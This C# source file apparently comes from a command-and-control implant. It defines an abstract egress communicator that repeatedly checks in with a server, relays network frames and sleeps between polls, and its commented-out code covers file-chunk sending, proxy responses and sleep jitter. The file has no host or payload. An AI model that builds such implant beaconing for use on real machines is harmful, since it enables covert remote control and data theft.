using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Shared;

namespace Agent.Communication
{
    internal abstract class EgressCommunicator : Communicator
    {
        public override event Func<NetFrame, Task> FrameReceived;
        public override event Action OnException;
        public EgressCommunicator(ConnexionUrl connexion) : base(connexion)
        {
            this.CommunicationType = CommunicationType.Egress;
        }

        public override async Task Start()
        {

        }

        public override async Task Run()
        {
            this.IsRunning = true;
            while (!_tokenSource.IsCancellationRequested)
            {
                try
                {
                    //var results = this.NetworkeService.GetMessageResultsToRelay();

                    //var thisAgentRes = results.Where(a => a.Header.Owner == this.MessageService.AgentMetaData.Id);
                    //if (thisAgentRes.Any())
                    //{
                    //    foreach (var mess in thisAgentRes)
                    //        mess.FileChunk = this.FileService.GetChunkToSend();

                    //    thisAgentRes.First().ProxyMessages = this.ProxyService.GetResponses();
                    //}
                    //else
                    //{
                    //    //check in message
                    //    var chunk = this.FileService.GetChunkToSend();
                    //    var proxy = this.ProxyService.GetResponses();

                    //    var mess = new MessageResult();
                    //    mess.Header.Owner = this.MessageService.AgentMetaData.Id;
                    //    mess.FileChunk = chunk;
                    //    mess.ProxyMessages = proxy;
                    //    results.Add(mess);
                    //}

                    ////update Paths
                    //foreach (var resMess in results)
                    //    resMess.Header.Path.Insert(0, this.MessageService.AgentMetaData.Id);

                    //var messages = await CheckIn(results);
                    //if (messages != null)
                    //    this.MessageService.EnqueueTasks(messages);


                    await this.DoCheckIn();

                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine(ex.ToString());
#endif
                }

                try
                {
                    Task.Delay(this.GetDelay()).Wait();
                }
                catch (TaskCanceledException ex)
                {
                    //ignore
                }
            }

            this.IsRunning = false;
        }

        public async Task DoCheckIn()
        {
            var frames = await CheckIn(this.NetworkeService.GetFrames(String.Empty));
            if (frames != null)
                frames.ForEach(frame => this.FrameReceived?.Invoke(frame));
        }

        protected abstract Task<List<NetFrame>> CheckIn(List<NetFrame> frames);

        protected virtual int GetDelay()
        {
            return 10;
            //int jit = (int)Math.Round(this.MessageService.AgentMetaData.SleepInterval * 1000 * (this.MessageService.AgentMetaData.SleepJitter / 100.0));
            //var delta = random.Next(0, jit);
            //return Math.Max(100,this.MessageService.AgentMetaData.SleepInterval * 1000 - delta);
        }

        public override async Task SendFrame(NetFrame frame)
        {
            this.NetworkeService.EnqueueFrame(frame);
        }

    }
}
